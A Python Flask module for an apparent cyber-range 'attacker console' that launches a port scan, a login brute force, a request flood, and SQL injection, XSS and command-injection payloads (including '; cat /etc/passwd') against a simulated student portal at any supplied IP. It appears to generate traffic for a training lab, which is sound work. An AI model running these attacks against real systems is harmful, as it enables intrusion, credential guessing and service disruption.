from flask import Blueprint, render_template, request, jsonify
import requests
import socket

attacker_bp = Blueprint('attacker_bp', __name__, url_prefix='/attacker')

@attacker_bp.route('/')
def console():
    return render_template('attacker.html')

@attacker_bp.route('/api/attack', methods=['POST'])
def api_attack():
    attack_type = request.json.get('type')
    target_ip = request.json.get('target', '127.0.0.1')
    
    # Target the new Student Portal endpoints
    base_url = f"http://{target_ip}:5000/portal"
    
    try:
        if attack_type == 'port_scan':
            # Real Port Scan
            ports = [21, 22, 80, 443, 8080, 5000]
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((target_ip, port))
                    sock.close()
                    
                    # If port 5000 is open, send an HTTP probe so the Victim logs it
                    if port == 5000 and result == 0:
                         requests.get(f"{base_url}/login", headers={'User-Agent': 'CyberSim-Scanner'}, timeout=1)
                except:
                    pass
                
        elif attack_type == 'brute_force':
            # Real Brute Force against Portal Login
            url = f"{base_url}/login"
            usernames = ['admin', 'jdoe', 'root']
            passwords = ['123456', 'password', 'welcome']
            
            for user in usernames:
                for pwd in passwords:
                    try:
                        resp = requests.post(url, data={'username': user, 'password': pwd}, timeout=1)
                        # We don't care about success here, just generating traffic
                    except: pass
                
        elif attack_type == 'dos':
            try:
                count = int(request.json.get('count', 50))
            except:
                count = 50
            # Real DoS against Portal Home
            for _ in range(count):
                try:
                    requests.get(base_url + '/', timeout=0.1)
                except: pass

        elif attack_type == 'sqli':
            # Real SQLi against Portal Login
            requests.post(f"{base_url}/login", data={'username': "admin' OR 1=1 --", 'password': 'x'}, timeout=1)

        elif attack_type == 'xss':
            # Real XSS against Portal Search
            requests.get(f"{base_url}/search", params={'q': "<script>alert('XSS')</script>"}, timeout=1)

        elif attack_type == 'command_injection':
            # Real RCE - Note: The Victim Portal doesn't explicitly have this, but we can try hitting the old endpoint or just omit
            # For completeness, let's keep it assuming the simulated vulnerability exists or we target a 'hidden' endpoint
            # To be safe and realistic, let's simulate it hitting a 'system' endpoint if we had one, or just hit search with payload
             requests.get(f"{base_url}/search", params={'q': "; cat /etc/passwd"}, timeout=1)
            
        return jsonify({'status': 'success', 'message': f'{attack_type} execution completed'})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Attack failed: {str(e)}'}), 500
